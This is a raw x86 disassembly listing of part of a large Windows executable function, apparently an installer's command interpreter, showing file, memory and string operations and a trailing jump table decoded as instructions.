  402d58:	03 c0                	add    %eax,%eax
  402d5a:	89 44 24 14          	mov    %eax,0x14(%esp)
  402d5e:	66 39 2f             	cmp    %bp,(%edi)
  402d61:	74 3a                	je     0x402d9d
  402d63:	57                   	push   %edi
  402d64:	e8 52 47 00 00       	call   0x4074bb
  402d69:	8b f8                	mov    %eax,%edi
  402d6b:	8b 44 24 18          	mov    0x18(%esp),%eax
  402d6f:	0b 44 24 24          	or     0x24(%esp),%eax
  402d73:	75 11                	jne    0x402d86
  402d75:	39 6c 24 3c          	cmp    %ebp,0x3c(%esp)
  402d79:	74 0b                	je     0x402d86
  402d7b:	57                   	push   %edi
  402d7c:	57                   	push   %edi
  402d7d:	e8 d8 3c 00 00       	call   0x406a5a
  402d82:	85 c0                	test   %eax,%eax
  402d84:	78 17                	js     0x402d9d
  402d86:	ff 74 24 14          	push   0x14(%esp)
  402d8a:	68 08 01 41 00       	push   $0x410108
  402d8f:	57                   	push   %edi
  402d90:	e8 0c 45 00 00       	call   0x4072a1
  402d95:	85 c0                	test   %eax,%eax
  402d97:	0f 85 0b 06 00 00    	jne    0x4033a8
  402d9d:	8b de                	mov    %esi,%ebx
  402d9f:	e9 8d ec ff ff       	jmp    0x401a31
  402da4:	6a 02                	push   $0x2
  402da6:	59                   	pop    %ecx
  402da7:	51                   	push   %ecx
  402da8:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  402dac:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402db0:	e8 5a 07 00 00       	call   0x40350f
  402db5:	33 f6                	xor    %esi,%esi
  402db7:	46                   	inc    %esi
  402db8:	59                   	pop    %ecx
  402db9:	3b c6                	cmp    %esi,%eax
  402dbb:	0f 8c e7 05 00 00    	jl     0x4033a8
  402dc1:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  402dc6:	3b c1                	cmp    %ecx,%eax
  402dc8:	0f 4f c1             	cmovg  %ecx,%eax
  402dcb:	89 44 24 20          	mov    %eax,0x20(%esp)
  402dcf:	66 39 2f             	cmp    %bp,(%edi)
  402dd2:	0f 84 a1 01 00 00    	je     0x402f79
  402dd8:	57                   	push   %edi
  402dd9:	89 6c 24 54          	mov    %ebp,0x54(%esp)
  402ddd:	e8 d9 46 00 00       	call   0x4074bb
  402de2:	8b c8                	mov    %eax,%ecx
  402de4:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402de8:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402dec:	39 6c 24 20          	cmp    %ebp,0x20(%esp)
  402df0:	0f 86 87 01 00 00    	jbe    0x402f7d
  402df6:	c7 44 24 54 0d 00 00 	movl   $0xd,0x54(%esp)
  402dfd:	00 
  402dfe:	8b dd                	mov    %ebp,%ebx
  402e00:	83 7c 24 2c 39       	cmpl   $0x39,0x2c(%esp)
  402e05:	0f 85 b7 00 00 00    	jne    0x402ec2
  402e0b:	55                   	push   %ebp
  402e0c:	8d 44 24 50          	lea    0x50(%esp),%eax
  402e10:	50                   	push   %eax
  402e11:	6a 02                	push   $0x2
  402e13:	58                   	pop    %eax
  402e14:	2b 44 24 44          	sub    0x44(%esp),%eax
  402e18:	50                   	push   %eax
  402e19:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402e1d:	50                   	push   %eax
  402e1e:	51                   	push   %ecx
  402e1f:	ff 15 20 91 40 00    	call   *0x409120
  402e25:	85 c0                	test   %eax,%eax
  402e27:	0f 84 50 01 00 00    	je     0x402f7d
  402e2d:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  402e31:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  402e35:	85 c9                	test   %ecx,%ecx
  402e37:	0f 84 40 01 00 00    	je     0x402f7d
  402e3d:	0f b6 44 24 10       	movzbl 0x10(%esp),%eax
  402e42:	89 44 24 48          	mov    %eax,0x48(%esp)
  402e46:	39 6c 24 3c          	cmp    %ebp,0x3c(%esp)
  402e4a:	0f 85 1a 01 00 00    	jne    0x402f6a
  402e50:	56                   	push   %esi
  402e51:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  402e55:	50                   	push   %eax
  402e56:	51                   	push   %ecx
  402e57:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402e5b:	50                   	push   %eax
  402e5c:	6a 08                	push   $0x8
  402e5e:	55                   	push   %ebp
  402e5f:	ff 15 d4 90 40 00    	call   *0x4090d4
  402e65:	85 c0                	test   %eax,%eax
  402e67:	0f 85 87 00 00 00    	jne    0x402ef4
  402e6d:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402e71:	8b d1                	mov    %ecx,%edx
  402e73:	f7 da                	neg    %edx
  402e75:	83 6c 24 4c 01       	subl   $0x1,0x4c(%esp)
  402e7a:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  402e7f:	89 44 24 48          	mov    %eax,0x48(%esp)
  402e83:	74 77                	je     0x402efc
  402e85:	56                   	push   %esi
  402e86:	49                   	dec    %ecx
  402e87:	42                   	inc    %edx
  402e88:	55                   	push   %ebp
  402e89:	52                   	push   %edx
  402e8a:	ff 74 24 20          	push   0x20(%esp)
  402e8e:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  402e92:	89 54 24 34          	mov    %edx,0x34(%esp)
  402e96:	ff 15 18 91 40 00    	call   *0x409118
  402e9c:	56                   	push   %esi
  402e9d:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  402ea1:	50                   	push   %eax
  402ea2:	ff 74 24 54          	push   0x54(%esp)
  402ea6:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402eaa:	50                   	push   %eax
  402eab:	6a 08                	push   $0x8
  402ead:	55                   	push   %ebp
  402eae:	ff 15 d4 90 40 00    	call   *0x4090d4
  402eb4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402eb8:	8b 54 24 24          	mov    0x24(%esp),%edx
  402ebc:	85 c0                	test   %eax,%eax
  402ebe:	74 b5                	je     0x402e75
  402ec0:	eb 32                	jmp    0x402ef4
  402ec2:	39 6c 24 3c          	cmp    %ebp,0x3c(%esp)
  402ec6:	75 17                	jne    0x402edf
  402ec8:	85 db                	test   %ebx,%ebx
  402eca:	75 13                	jne    0x402edf
  402ecc:	55                   	push   %ebp
  402ecd:	51                   	push   %ecx
  402ece:	e8 87 3b 00 00       	call   0x406a5a
  402ed3:	85 c0                	test   %eax,%eax
  402ed5:	0f 88 a2 00 00 00    	js     0x402f7d
  402edb:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402edf:	6a 02                	push   $0x2
  402ee1:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  402ee5:	50                   	push   %eax
  402ee6:	51                   	push   %ecx
  402ee7:	e8 f2 42 00 00       	call   0x4071de
  402eec:	85 c0                	test   %eax,%eax
  402eee:	0f 84 89 00 00 00    	je     0x402f7d
  402ef4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402ef8:	8b 44 24 48          	mov    0x48(%esp),%eax
  402efc:	39 6c 24 3c          	cmp    %ebp,0x3c(%esp)
  402f00:	75 68                	jne    0x402f6a
  402f02:	6a 0d                	push   $0xd
  402f04:	5a                   	pop    %edx
  402f05:	66 39 54 24 50       	cmp    %dx,0x50(%esp)
  402f0a:	6a 0a                	push   $0xa
  402f0c:	5a                   	pop    %edx
  402f0d:	74 2c                	je     0x402f3b
  402f0f:	66 39 54 24 50       	cmp    %dx,0x50(%esp)
  402f14:	74 25                	je     0x402f3b
  402f16:	66 89 04 5f          	mov    %ax,(%edi,%ebx,2)
  402f1a:	43                   	inc    %ebx
  402f1b:	0f b7 c0             	movzwl %ax,%eax
  402f1e:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402f22:	89 44 24 50          	mov    %eax,0x50(%esp)
  402f26:	66 85 c0             	test   %ax,%ax
  402f29:	74 52                	je     0x402f7d
  402f2b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402f2f:	3b 5c 24 20          	cmp    0x20(%esp),%ebx
  402f33:	0f 8c c7 fe ff ff    	jl     0x402e00
  402f39:	eb 42                	jmp    0x402f7d
  402f3b:	66 39 44 24 50       	cmp    %ax,0x50(%esp)
  402f40:	74 17                	je     0x402f59
  402f42:	66 3b 44 24 54       	cmp    0x54(%esp),%ax
  402f47:	74 05                	je     0x402f4e
  402f49:	66 3b c2             	cmp    %dx,%ax
  402f4c:	75 0b                	jne    0x402f59
  402f4e:	66 89 04 5f          	mov    %ax,(%edi,%ebx,2)
  402f52:	43                   	inc    %ebx
  402f53:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402f57:	eb 24                	jmp    0x402f7d
  402f59:	56                   	push   %esi
  402f5a:	55                   	push   %ebp
  402f5b:	f7 d9                	neg    %ecx
  402f5d:	51                   	push   %ecx
  402f5e:	ff 74 24 20          	push   0x20(%esp)
  402f62:	ff 15 18 91 40 00    	call   *0x409118
  402f68:	eb 13                	jmp    0x402f7d
  402f6a:	0f b7 c0             	movzwl %ax,%eax
  402f6d:	50                   	push   %eax
  402f6e:	57                   	push   %edi
  402f6f:	e8 19 3e 00 00       	call   0x406d8d
  402f74:	e9 39 04 00 00       	jmp    0x4033b2
  402f79:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402f7d:	8b 44 24 18          	mov    0x18(%esp),%eax
  402f81:	33 c9                	xor    %ecx,%ecx
  402f83:	33 db                	xor    %ebx,%ebx
  402f85:	85 c0                	test   %eax,%eax
  402f87:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  402f8b:	e9 43 ec ff ff       	jmp    0x401bd3
  402f90:	66 39 2f             	cmp    %bp,(%edi)
  402f93:	0f 84 0f 04 00 00    	je     0x4033a8
  402f99:	6a 02                	push   $0x2
  402f9b:	e8 6f 05 00 00       	call   0x40350f
  402fa0:	59                   	pop    %ecx
  402fa1:	ff 74 24 3c          	push   0x3c(%esp)
  402fa5:	55                   	push   %ebp
  402fa6:	50                   	push   %eax
  402fa7:	57                   	push   %edi
  402fa8:	e8 0e 45 00 00       	call   0x4074bb
  402fad:	50                   	push   %eax
  402fae:	ff 15 18 91 40 00    	call   *0x409118
  402fb4:	39 6c 24 34          	cmp    %ebp,0x34(%esp)
  402fb8:	0f 8c ea 03 00 00    	jl     0x4033a8
  402fbe:	50                   	push   %eax
  402fbf:	56                   	push   %esi
  402fc0:	e9 63 e7 ff ff       	jmp    0x401728
  402fc5:	57                   	push   %edi
  402fc6:	e8 f0 44 00 00       	call   0x4074bb
  402fcb:	85 c0                	test   %eax,%eax
  402fcd:	0f 84 d5 03 00 00    	je     0x4033a8
  402fd3:	50                   	push   %eax
  402fd4:	ff 15 38 91 40 00    	call   *0x409138
  402fda:	e9 c9 03 00 00       	jmp    0x4033a8
  402fdf:	56                   	push   %esi
  402fe0:	e8 d6 44 00 00       	call   0x4074bb
  402fe5:	85 c0                	test   %eax,%eax
  402fe7:	0f 84 1a ea ff ff    	je     0x401a07
  402fed:	8d 8c 24 90 00 00 00 	lea    0x90(%esp),%ecx
  402ff4:	51                   	push   %ecx
  402ff5:	50                   	push   %eax
  402ff6:	ff 15 30 91 40 00    	call   *0x409130
  402ffc:	85 c0                	test   %eax,%eax
  402ffe:	0f 84 03 ea ff ff    	je     0x401a07
  403004:	eb 2c                	jmp    0x403032
  403006:	6a 02                	push   $0x2
  403008:	e8 3e 05 00 00       	call   0x40354b
  40300d:	8d 8c 24 90 00 00 00 	lea    0x90(%esp),%ecx
  403014:	51                   	push   %ecx
  403015:	50                   	push   %eax
  403016:	ff 15 34 91 40 00    	call   *0x409134
  40301c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40301f:	75 0a                	jne    0x40302b
  403021:	33 c0                	xor    %eax,%eax
  403023:	66 89 06             	mov    %ax,(%esi)
  403026:	e9 b1 fc ff ff       	jmp    0x402cdc
  40302b:	50                   	push   %eax
  40302c:	56                   	push   %esi
  40302d:	e8 5b 3d 00 00       	call   0x406d8d
  403032:	8d 84 24 bc 00 00 00 	lea    0xbc(%esp),%eax
  403039:	50                   	push   %eax
  40303a:	57                   	push   %edi
  40303b:	e8 70 43 00 00       	call   0x4073b0
  403040:	e9 63 03 00 00       	jmp    0x4033a8
  403045:	6a f0                	push   $0xfffffff0
  403047:	e8 ff 04 00 00       	call   0x40354b
  40304c:	8b f0                	mov    %eax,%esi
  40304e:	56                   	push   %esi
  40304f:	89 74 24 58          	mov    %esi,0x58(%esp)
  403053:	e8 3f 46 00 00       	call   0x407697
  403058:	85 c0                	test   %eax,%eax
  40305a:	75 07                	jne    0x403063
  40305c:	6a ed                	push   $0xffffffed
  40305e:	e8 e8 04 00 00       	call   0x40354b
  403063:	56                   	push   %esi
  403064:	e8 ca 43 00 00       	call   0x407433
  403069:	6a 02                	push   $0x2
  40306b:	68 00 00 00 40       	push   $0x40000000
  403070:	56                   	push   %esi
  403071:	e8 3b 41 00 00       	call   0x4071b1
  403076:	8b f8                	mov    %eax,%edi
  403078:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40307c:	83 ff ff             	cmp    $0xffffffff,%edi
  40307f:	0f 84 d1 00 00 00    	je     0x403156
  403085:	8b 44 24 34          	mov    0x34(%esp),%eax
  403089:	89 44 24 24          	mov    %eax,0x24(%esp)
  40308d:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  403091:	0f 84 ab 00 00 00    	je     0x403142
  403097:	a1 28 e2 47 00       	mov    0x47e228,%eax
  40309c:	50                   	push   %eax
  40309d:	6a 40                	push   $0x40
  40309f:	89 44 24 28          	mov    %eax,0x28(%esp)
  4030a3:	ff 15 f8 90 40 00    	call   *0x4090f8
  4030a9:	8b f8                	mov    %eax,%edi
  4030ab:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4030af:	85 ff                	test   %edi,%edi
  4030b1:	0f 84 83 00 00 00    	je     0x40313a
  4030b7:	55                   	push   %ebp
  4030b8:	e8 81 05 00 00       	call   0x40363e
  4030bd:	ff 74 24 20          	push   0x20(%esp)
  4030c1:	57                   	push   %edi
  4030c2:	e8 61 05 00 00       	call   0x403628
  4030c7:	ff 74 24 38          	push   0x38(%esp)
  4030cb:	6a 40                	push   $0x40
  4030cd:	ff 15 f8 90 40 00    	call   *0x4090f8
  4030d3:	8b f8                	mov    %eax,%edi
  4030d5:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4030d9:	85 ff                	test   %edi,%edi
  4030db:	74 3f                	je     0x40311c
  4030dd:	ff 74 24 38          	push   0x38(%esp)
  4030e1:	57                   	push   %edi
  4030e2:	55                   	push   %ebp
  4030e3:	ff 74 24 40          	push   0x40(%esp)
  4030e7:	e8 69 05 00 00       	call   0x403655
  4030ec:	80 3f 00             	cmpb   $0x0,(%edi)
  4030ef:	74 21                	je     0x403112
  4030f1:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4030f5:	8b 37                	mov    (%edi),%esi
  4030f7:	8b 47 04             	mov    0x4(%edi),%eax
  4030fa:	83 c7 08             	add    $0x8,%edi
  4030fd:	56                   	push   %esi
  4030fe:	57                   	push   %edi
  4030ff:	03 c3                	add    %ebx,%eax
  403101:	50                   	push   %eax
  403102:	e8 e9 3d 00 00       	call   0x406ef0
  403107:	03 fe                	add    %esi,%edi
  403109:	80 3f 00             	cmpb   $0x0,(%edi)
  40310c:	75 e7                	jne    0x4030f5
  40310e:	8b 74 24 54          	mov    0x54(%esp),%esi
  403112:	ff 74 24 24          	push   0x24(%esp)
  403116:	ff 15 f4 90 40 00    	call   *0x4090f4
  40311c:	ff 74 24 20          	push   0x20(%esp)
  403120:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403124:	57                   	push   %edi
  403125:	ff 74 24 20          	push   0x20(%esp)
  403129:	e8 73 41 00 00       	call   0x4072a1
  40312e:	57                   	push   %edi
  40312f:	ff 15 f4 90 40 00    	call   *0x4090f4
  403135:	83 c8 ff             	or     $0xffffffff,%eax
  403138:	eb 04                	jmp    0x40313e
  40313a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40313e:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403142:	55                   	push   %ebp
  403143:	55                   	push   %ebp
  403144:	57                   	push   %edi
  403145:	50                   	push   %eax
  403146:	e8 0a 05 00 00       	call   0x403655
  40314b:	57                   	push   %edi
  40314c:	8b e8                	mov    %eax,%ebp
  40314e:	ff 15 10 91 40 00    	call   *0x409110
  403154:	eb 05                	jmp    0x40315b
  403156:	bd 66 fd ff ff       	mov    $0xfffffd66,%ebp
  40315b:	56                   	push   %esi
  40315c:	55                   	push   %ebp
  40315d:	68 34 9f 40 00       	push   $0x409f34
  403162:	e8 bd 3c 00 00       	call   0x406e24
  403167:	83 c4 0c             	add    $0xc,%esp
  40316a:	6a f3                	push   $0xfffffff3
  40316c:	5f                   	pop    %edi
  40316d:	85 ed                	test   %ebp,%ebp
  40316f:	79 11                	jns    0x403182
  403171:	6a ef                	push   $0xffffffef
  403173:	5f                   	pop    %edi
  403174:	56                   	push   %esi
  403175:	ff 15 3c 91 40 00    	call   *0x40913c
  40317b:	33 db                	xor    %ebx,%ebx
  40317d:	43                   	inc    %ebx
  40317e:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403182:	68 08 01 41 00       	push   $0x410108
  403187:	57                   	push   %edi
  403188:	e9 d2 e4 ff ff       	jmp    0x40165f
  40318d:	85 c9                	test   %ecx,%ecx
  40318f:	74 3e                	je     0x4031cf
  403191:	52                   	push   %edx
  403192:	68 70 9f 40 00       	push   $0x409f70
  403197:	e8 88 3c 00 00       	call   0x406e24
  40319c:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4031a0:	50                   	push   %eax
  4031a1:	68 a0 9f 40 00       	push   $0x409fa0
  4031a6:	a3 a0 d1 46 00       	mov    %eax,0x46d1a0
  4031ab:	e8 74 3c 00 00       	call   0x406e24
  4031b0:	83 c4 10             	add    $0x10,%esp
  4031b3:	39 6c 24 34          	cmp    %ebp,0x34(%esp)
  4031b7:	74 0a                	je     0x4031c3
  4031b9:	e8 17 2c 00 00       	call   0x405dd5
  4031be:	e9 e5 01 00 00       	jmp    0x4033a8
  4031c3:	6a 01                	push   $0x1
  4031c5:	e8 8c 3c 00 00       	call   0x406e56
  4031ca:	e9 d9 01 00 00       	jmp    0x4033a8
  4031cf:	6a 01                	push   $0x1
  4031d1:	e8 75 03 00 00       	call   0x40354b
  4031d6:	50                   	push   %eax
  4031d7:	68 60 98 40 00       	push   $0x409860
  4031dc:	e9 8c e7 ff ff       	jmp    0x40196d
  4031e1:	55                   	push   %ebp
  4031e2:	e8 28 03 00 00       	call   0x40350f
  4031e7:	8b e8                	mov    %eax,%ebp
  4031e9:	59                   	pop    %ecx
  4031ea:	3b 2d 4c e2 47 00    	cmp    0x47e24c,%ebp
  4031f0:	0f 83 38 e8 ff ff    	jae    0x401a2e
  4031f6:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  4031fa:	69 fd 18 40 00 00    	imul   $0x4018,%ebp,%edi
  403200:	03 3d 48 e2 47 00    	add    0x47e248,%edi
  403206:	85 c9                	test   %ecx,%ecx
  403208:	78 13                	js     0x40321d
  40320a:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  40320d:	0f 85 ab fd ff ff    	jne    0x402fbe
  403213:	8d 47 18             	lea    0x18(%edi),%eax
  403216:	50                   	push   %eax
  403217:	56                   	push   %esi
  403218:	e9 1e fe ff ff       	jmp    0x40303b
  40321d:	83 c8 ff             	or     $0xffffffff,%eax
  403220:	2b c1                	sub    %ecx,%eax
  403222:	89 44 24 38          	mov    %eax,0x38(%esp)
  403226:	74 10                	je     0x403238
  403228:	6a 01                	push   $0x1
  40322a:	e8 e0 02 00 00       	call   0x40350f
  40322f:	59                   	pop    %ecx
  403230:	8b c8                	mov    %eax,%ecx
  403232:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  403236:	eb 18                	jmp    0x403250
  403238:	ff 74 24 40          	push   0x40(%esp)
  40323c:	8d 47 18             	lea    0x18(%edi),%eax
  40323f:	50                   	push   %eax
  403240:	e8 4c 32 00 00       	call   0x406491
  403245:	81 4f 08 00 01 00 00 	orl    $0x100,0x8(%edi)
  40324c:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  403250:	8b 44 24 38          	mov    0x38(%esp),%eax
  403254:	89 0c 87             	mov    %ecx,(%edi,%eax,4)
  403257:	83 7c 24 3c 00       	cmpl   $0x0,0x3c(%esp)
  40325c:	0f 84 46 01 00 00    	je     0x4033a8
  403262:	55                   	push   %ebp
  403263:	e8 b9 df ff ff       	call   0x401221
  403268:	e9 3b 01 00 00       	jmp    0x4033a8
  40326d:	55                   	push   %ebp
  40326e:	e8 9c 02 00 00       	call   0x40350f
  403273:	8b d0                	mov    %eax,%edx
  403275:	59                   	pop    %ecx
  403276:	83 fa 20             	cmp    $0x20,%edx
  403279:	0f 83 af e7 ff ff    	jae    0x401a2e
  40327f:	39 6c 24 3c          	cmp    %ebp,0x3c(%esp)
  403283:	74 23                	je     0x4032a8
  403285:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  403289:	74 12                	je     0x40329d
  40328b:	52                   	push   %edx
  40328c:	e8 ff df ff ff       	call   0x401290
  403291:	55                   	push   %ebp
  403292:	55                   	push   %ebp
  403293:	e8 45 e0 ff ff       	call   0x4012dd
  403298:	e9 0b 01 00 00       	jmp    0x4033a8
  40329d:	55                   	push   %ebp
  40329e:	e8 fd de ff ff       	call   0x4011a0
  4032a3:	e9 16 fd ff ff       	jmp    0x402fbe
  4032a8:	a1 30 e2 47 00       	mov    0x47e230,%eax
  4032ad:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  4032b1:	74 10                	je     0x4032c3
  4032b3:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4032b7:	89 8c 90 94 00 00 00 	mov    %ecx,0x94(%eax,%edx,4)
  4032be:	e9 e5 00 00 00       	jmp    0x4033a8
  4032c3:	ff b4 90 94 00 00 00 	push   0x94(%eax,%edx,4)
  4032ca:	56                   	push   %esi
  4032cb:	e8 c1 31 00 00       	call   0x406491
  4032d0:	e9 d3 00 00 00       	jmp    0x4033a8
  4032d5:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4032d9:	2b c5                	sub    %ebp,%eax
  4032db:	74 4a                	je     0x403327
  4032dd:	83 e8 01             	sub    $0x1,%eax
  4032e0:	0f 85 c2 00 00 00    	jne    0x4033a8
  4032e6:	6a 02                	push   $0x2
  4032e8:	e8 22 02 00 00       	call   0x40350f
  4032ed:	6a 04                	push   $0x4
  4032ef:	8b f0                	mov    %eax,%esi
  4032f1:	e8 19 02 00 00       	call   0x40350f
  4032f6:	59                   	pop    %ecx
  4032f7:	0f b6 d0             	movzbl %al,%edx
  4032fa:	59                   	pop    %ecx
  4032fb:	c1 e8 18             	shr    $0x18,%eax
  4032fe:	b9 e0 e2 47 00       	mov    $0x47e2e0,%ecx
  403303:	85 f6                	test   %esi,%esi
  403305:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  403309:	52                   	push   %edx
  40330a:	0f 45 ce             	cmovne %esi,%ecx
  40330d:	03 c1                	add    %ecx,%eax
  40330f:	50                   	push   %eax
  403310:	8d 44 24 28          	lea    0x28(%esp),%eax
  403314:	50                   	push   %eax
  403315:	e8 d6 3b 00 00       	call   0x406ef0
  40331a:	ff 74 24 20          	push   0x20(%esp)
  40331e:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  403322:	e9 00 e4 ff ff       	jmp    0x401727
  403327:	6a 05                	push   $0x5
  403329:	e8 4e 3e 00 00       	call   0x40717c
  40332e:	6a 22                	push   $0x22
  403330:	8b f8                	mov    %eax,%edi
  403332:	e8 14 02 00 00       	call   0x40354b
  403337:	85 ff                	test   %edi,%edi
  403339:	74 3b                	je     0x403376
  40333b:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  40333f:	51                   	push   %ecx
  403340:	50                   	push   %eax
  403341:	ff 15 b0 92 40 00    	call   *0x4092b0
  403347:	85 c0                	test   %eax,%eax
  403349:	78 2b                	js     0x403376
  40334b:	8d 44 24 20          	lea    0x20(%esp),%eax
  40334f:	50                   	push   %eax
  403350:	55                   	push   %ebp
  403351:	ff 74 24 44          	push   0x44(%esp)
  403355:	8d 44 24 60          	lea    0x60(%esp),%eax
  403359:	50                   	push   %eax
  40335a:	ff d7                	call   *%edi
  40335c:	85 c0                	test   %eax,%eax
  40335e:	78 16                	js     0x403376
  403360:	ff 74 24 20          	push   0x20(%esp)
  403364:	56                   	push   %esi
  403365:	e8 46 40 00 00       	call   0x4073b0
  40336a:	ff 74 24 20          	push   0x20(%esp)
  40336e:	ff 15 ac 92 40 00    	call   *0x4092ac
  403374:	eb 32                	jmp    0x4033a8
  403376:	33 db                	xor    %ebx,%ebx
  403378:	43                   	inc    %ebx
  403379:	33 c0                	xor    %eax,%eax
  40337b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40337f:	66 89 06             	mov    %ax,(%esi)
  403382:	eb 24                	jmp    0x4033a8
  403384:	23 0d 40 1d 44 00    	and    0x441d40,%ecx
  40338a:	55                   	push   %ebp
  40338b:	51                   	push   %ecx
  40338c:	6a 0b                	push   $0xb
  40338e:	50                   	push   %eax
  40338f:	ff 15 64 92 40 00    	call   *0x409264
  403395:	39 6c 24 30          	cmp    %ebp,0x30(%esp)
  403399:	74 0d                	je     0x4033a8
  40339b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40339f:	55                   	push   %ebp
  4033a0:	55                   	push   %ebp
  4033a1:	50                   	push   %eax
  4033a2:	ff 15 3c 92 40 00    	call   *0x40923c
  4033a8:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4033ac:	01 1d e8 e2 47 00    	add    %ebx,0x47e2e8
  4033b2:	33 c0                	xor    %eax,%eax
  4033b4:	5f                   	pop    %edi
  4033b5:	5e                   	pop    %esi
  4033b6:	5d                   	pop    %ebp
  4033b7:	5b                   	pop    %ebx
  4033b8:	81 c4 d0 02 00 00    	add    $0x2d0,%esp
  4033be:	c2 04 00             	ret    $0x4
  4033c1:	66 90                	xchg   %ax,%ax
  4033c3:	d5 15                	aad    $0x15
  4033c5:	40                   	inc    %eax
  4033c6:	00 eb                	add    %ch,%bl
  4033c8:	15 40 00 12 16       	adc    $0x16120040,%eax
  4033cd:	40                   	inc    %eax
  4033ce:	00 25 16 40 00 47    	add    %ah,0x47004016
  4033d4:	16                   	push   %ss
  4033d5:	40                   	inc    %eax
  4033d6:	00 69 16             	add    %ch,0x16(%ecx)
  4033d9:	40                   	inc    %eax
  4033da:	00 93 16 40 00 32    	add    %dl,0x32004016(%ebx)
  4033e0:	17                   	pop    %ss
  4033e1:	40                   	inc    %eax
  4033e2:	00 5f 17             	add    %bl,0x17(%edi)
  4033e5:	40                   	inc    %eax
  4033e6:	00 a4 17 40 00 ac 18 	add    %ah,0x18ac0040(%edi,%edx,1)
  4033ed:	40                   	inc    %eax
  4033ee:	00 ae 16 40 00 f5    	add    %ch,-0xaffbfea(%esi)
  4033f4:	16                   	push   %ss
  4033f5:	40                   	inc    %eax
  4033f6:	00 20                	add    %ah,(%eax)
  4033f8:	17                   	pop    %ss
  4033f9:	40                   	inc    %eax
  4033fa:	00 f4                	add    %dh,%ah
  4033fc:	18 40 00             	sbb    %al,0x0(%eax)
  4033ff:	78 19                	js     0x40341a
  403401:	40                   	inc    %eax
  403402:	00 e4                	add    %ah,%ah
  403404:	19 40 00             	sbb    %eax,0x0(%eax)
  403407:	18 1a                	sbb    %bl,(%edx)
  403409:	40                   	inc    %eax
  40340a:	00 3a                	add    %bh,(%edx)
  40340c:	1a 40 00             	sbb    0x0(%eax),%al
  40340f:	85 1c 40             	test   %ebx,(%eax,%eax,2)
  403412:	00 a9 1c 40 00 f3    	add    %ch,-0xcffbfe4(%ecx)
  403418:	1c 40                	sbb    $0x40,%al
  40341a:	00 04 1d 40 00 17 1d 	add    %al,0x1d170040(,%ebx,1)
  403421:	40                   	inc    %eax
  403422:	00 a0 1d 40 00 d0    	add    %ah,-0x2fffbfe3(%eax)
  403428:	1d 40 00 18 1e       	sbb    $0x1e180040,%eax
  40342d:	40                   	inc    %eax
  40342e:	00 58 1e             	add    %bl,0x1e(%eax)
  403431:	40                   	inc    %eax
  403432:	00 ee                	add    %ch,%dh
  403434:	1e                   	push   %ds
  403435:	40                   	inc    %eax
  403436:	00 0f                	add    %cl,(%edi)
  403438:	1f                   	pop    %ds
  403439:	40                   	inc    %eax
  40343a:	00 d9                	add    %bl,%cl
  40343c:	1f                   	pop    %ds
  40343d:	40                   	inc    %eax
  40343e:	00 d9                	add    %bl,%cl
  403440:	1f                   	pop    %ds
  403441:	40                   	inc    %eax
  403442:	00 ba 20 40 00 d5    	add    %bh,-0x2affbfe0(%edx)
  403448:	20 40 00             	and    %al,0x0(%eax)
  40344b:	f4                   	hlt
  40344c:	20 40 00             	and    %al,0x0(%eax)
  40344f:	12 21                	adc    (%ecx),%ah
  403451:	40                   	inc    %eax
  403452:	00 e8                	add    %ch,%al
  403454:	21 40 00             	and    %eax,0x0(%eax)
  403457:	78 22                	js     0x40347b
  403459:	40                   	inc    %eax
  40345a:	00 ba 22 40 00 8b    	add    %bh,-0x74ffbfde(%edx)
  403460:	23 40 00             	and    0x0(%eax),%eax
  403463:	fe                   	(bad)
  403464:	23 40 00             	and    0x0(%eax),%eax
  403467:	2f                   	das
  403468:	24 40                	and    $0x40,%al
  40346a:	00 f8                	add    %bh,%al
  40346c:	24 40                	and    $0x40,%al
  40346e:	00 20                	add    %ah,(%eax)
  403470:	26 40                	es inc %eax
  403472:	00 b8 27 40 00 5a    	add    %bh,0x5a004027(%eax)
  403478:	28 40 00             	sub    %al,0x0(%eax)
  40347b:	71 28                	jno    0x4034a5
  40347d:	40                   	inc    %eax
